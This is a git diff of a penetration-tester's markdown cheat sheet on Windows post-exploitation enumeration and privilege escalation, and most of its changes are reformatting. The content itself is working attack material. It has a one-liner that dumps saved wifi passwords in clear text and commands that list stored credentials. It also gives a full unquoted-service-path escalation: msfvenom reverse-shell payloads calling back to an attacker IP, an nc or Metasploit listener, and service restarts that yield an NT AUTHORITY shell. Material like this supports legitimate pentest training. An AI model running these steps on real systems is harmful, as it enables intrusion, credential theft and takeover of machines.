@@ -819,7 +819,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
 ### [WINDOWS POST EEXPLOITATION ENUMERATION](#)
 
-**Operating System Enumeration**
+######  Operating System Enumeration
 
 - OS Name and Version
     - `systeminfo | findstr "OS"`
@@ -829,7 +829,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
         - This info is useful for kernel exploits
 
-**Users and Permissions**
+###### Users and Privileges
 
 - List users and their permissions
     - `net users`
@@ -842,7 +842,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 - Get Privileges
     - `whoami /priv`
 
-**Network info enumeration**
+######  Network info enumeration
 
 - Available network interfaces
     - `ipconfig / all`
@@ -872,7 +872,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
     - Oneliner to extract all wifi passwords
         - `cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*`
 
-**Services Enumeration**
+######  Services Enumeration
 
 - Scheduled Tasks (scheduled bydefult and by task schedular)
     - `schtask`
@@ -881,12 +881,22 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 - Processes running
     - `tasklist /SVC`
 
-- Started services
+- Started services and their state
     - `net start`
     - `sc query`
         - `sc qc <service_name>`
 
-**Information Enumeration**
+- Service name,pathname,displayname,startmode
+
+- `wmic service get name,pathname,displayname,startmode`
+
+
+- `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
+`
+/i means ignore the case
+/v means except <this argument> find others.
+
+###### Information Enumeration
 
 - Find files
     - `where /r c:\windows todo.txt`
@@ -917,7 +927,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 - Currently stored credentials
     - `cmdkey /list`
 
-**DNS Server Enumeration**
+###### DNS Server Enumeration
 
 - Checking DNS server's used 
     - (miscondifured DNS server may be vulnerble to `DNS Zone Transfer attacks`)
@@ -927,34 +937,35 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
 ### [WINDOWS PRIVILEGE ESCALATION](#)
 
-#### Find Possible Privilege Escalation**
-###### Exploit Suggestor
 
+###### Exploit Suggestor & WinPeas
+- Both can be used to find vulnerabilities which can lead to PE
 - Finding Kernel exploit by using `Exploit Suggestor` on metasploit
     - `search exploit_suggest` > `multi/recon/local_exploit_suggester` > `set SESSION 1` > `exploit`
 
-###### WinPeas
-
-- Download WinPeas
+- Download WinPeas, transfer it to target and run
     - `https://github.com/carlospolop/PEASS-ng/releases/download/20230101/winPEASx64.exe`
 
 
 ###### UnquotedServicePath
 
 - Find the unquoted service path
-> `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
+- `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
+
+/i means ignore the case
+/v means except <this argument> find others.
 
 - Check if we/Users have write access to that folder using `icacls` 
 
-> `icacls "C:\Program Files\Zero Tier`
+- `icacls "C:\Program Files\Zero Tier`
 
 - If write access is there, then generate payload with folder name where space starts.
 
 (non-meterpreter binary)
->  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe  ` 
+-  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe  ` 
 
 (meterpreter binary)
-> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe`
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe`
 
 
 - Transfer payload to target server by whatever method
@@ -962,17 +973,17 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 - Start listener on attacker machine
 
 (for non-meterpreter binary)
-> `nc -nlvp 4444`
+- `nc -nlvp 4444`
 
 (for meterpreter binary)
 
-> use multi/handler
+- use metasploit multi/handler
 
 - Now start the service using cmd or poweshell
 
->`net start zerotieroneservice`
+- `net start zerotieroneservice`
 
->`Start-Service zerotieroneservice`
+- `Start-Service zerotieroneservice`
 
 - We get the reversehell with Privileged user/NT Authority
 
